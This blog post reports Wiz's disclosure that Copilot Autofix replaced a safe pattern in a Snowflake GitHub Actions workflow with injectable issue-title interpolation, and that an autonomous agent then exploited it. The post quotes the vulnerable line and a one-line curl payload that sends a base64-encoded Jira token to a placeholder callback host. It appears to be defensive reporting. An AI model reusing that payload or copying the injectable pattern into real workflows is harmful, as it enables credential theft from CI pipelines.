---
title: "The AI That Broke the Code, and the AI That Broke In"
date: 2026-08-18T06:16:49+00:00
draft: false
slug: copilot-autofix-red-agent-snowflake
categories: [security]
tags: [security, agents, copilot, github-actions, ci-cd]
params:
  author: AI Beat Desk
  summary: >-
    Wiz disclosed yesterday that GitHub Copilot Autofix co-authored a commit in
    Snowflake's public repo that silently removed a safe shell-input pattern and
    replaced it with injectable string interpolation. Wiz's autonomous Red Agent
    then found the flaw, crafted a working exploit, and exfiltrated Jira API
    credentials — all without human input. The same loop that promises AI-driven
    security is also capable of closing it the other way.
---

On June 18, 2026, a pull request was merged into one of Snowflake's public GitHub repositories. The commit was co-authored by "Copilot Autofix powered by AI" — GitHub's tool for automatically suggesting and applying code fixes. What it fixed, in this case, was the wrong thing.

[Wiz Research disclosed the full story yesterday](https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug), and the narrative has a clean, uncomfortable arc: an AI tool introduced a security vulnerability, and then an autonomous AI agent found it, exploited it, and walked out with credentials — no human required on either end.

## What Copilot Autofix broke

The vulnerable workflow was `jira_issue.yml`, a GitHub Actions file that fired on issue events and updated a Jira ticket. The repository had previously handled the issue title safely: it stored it in an `env:` block and passed it to a shell command via `jq --arg`, which keeps the value in a structured binding rather than interpolating it into a shell string.

Copilot Autofix replaced this with:

```yaml
run: TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g")
```

The template `${{ github.event.issue.title }}` expands before the shell runs. The `sed` escaping happens after expansion — meaning an attacker who titles an issue with a single quote can break out of the `echo` argument and inject arbitrary shell commands. The original pattern existed specifically to prevent this. Autofix removed it.

The workflow also had a guard condition meant to restrict which events could trigger it:

```yaml
if: (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')
```

On an `issues` event, `github.event.pull_request` is always null. The condition always evaluates true. Any GitHub user who could open an issue could trigger the vulnerable workflow — which is to say, essentially anyone.

## What Red Agent did with it

Wiz's Red Agent is their autonomous security research tool: it scans for vulnerabilities, generates exploits, and validates access, without step-by-step human direction. On June 23 — five days after the vulnerable commit was merged — it found the injection point in Snowflake's GitHub organization, crafted a payload to exfiltrate a Jira API token via an out-of-band HTTP callback, and adapted when initial attempts failed due to shell syntax errors. The final payload looked roughly like:

```
' ; curl -s "https://[oast].me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`..." ; echo '
```

Open an issue, wait seconds, collect base64-encoded credentials. Snowflake's internal Jira — including engineering and security compliance projects — was accessible with that token.

Snowflake was notified the same day and patched the workflow within hours. No evidence of unauthorized access beyond Wiz's controlled disclosure.

## The closed loop

The interesting thing here is not that an AI generated buggy code. That has been true of every code generation tool since the beginning. The interesting thing is the specific failure mode: Copilot Autofix *regressed* a working, intentionally safe pattern. The previous developers understood shell injection and had written the correct defense. The AI removed it, presumably because the `env:` + `jq` approach looked redundant or unfamiliar in the context of the surrounding code.

Static analysis and AI-based code review — including GitHub's own tooling — didn't flag the resulting vulnerability. Wiz notes explicitly that "GitHub's AI-assisted security review did not flag the resulting critical vulnerability."

On the other side of the equation, Red Agent shows what autonomous exploitation looks like at current capability levels: it's not dramatic, it's just fast and systematic. Given a GitHub org to scan and no human directing it, it found an injectable workflow, generated a working payload through iteration, and exfiltrated credentials in seconds. The adaptation step — trying a payload, observing that it failed, revising the syntax — is the part worth watching. That's not search; that's an exploit development loop running unattended.

The two AI systems never interact directly, but together they trace a complete vulnerability lifecycle: introduction, persistence (five days before anyone noticed), discovery, and exploitation. What used to require a security engineer on both ends now potentially requires one on neither.

This doesn't mean CI/CD pipelines are suddenly more dangerous than they were last month. Shell injection in GitHub Actions `run:` blocks from untrusted issue/PR titles is a well-documented class of vulnerability, and good tooling already flags direct `${{ }}` expansion in run blocks. What changes is the asymmetry: the code-generating side is scaling fast and will make these mistakes at higher volume, while the exploit-generating side is scaling just as fast and will find them at higher frequency. The gap between introduction and discovery is what gets compressed.

For practical purposes: if you're using Copilot Autofix or similar tools, the output is not reviewed code — it's a draft requiring the same scrutiny you'd give any external contribution. AI tools removing existing defensive patterns is a real failure mode worth watching for explicitly.
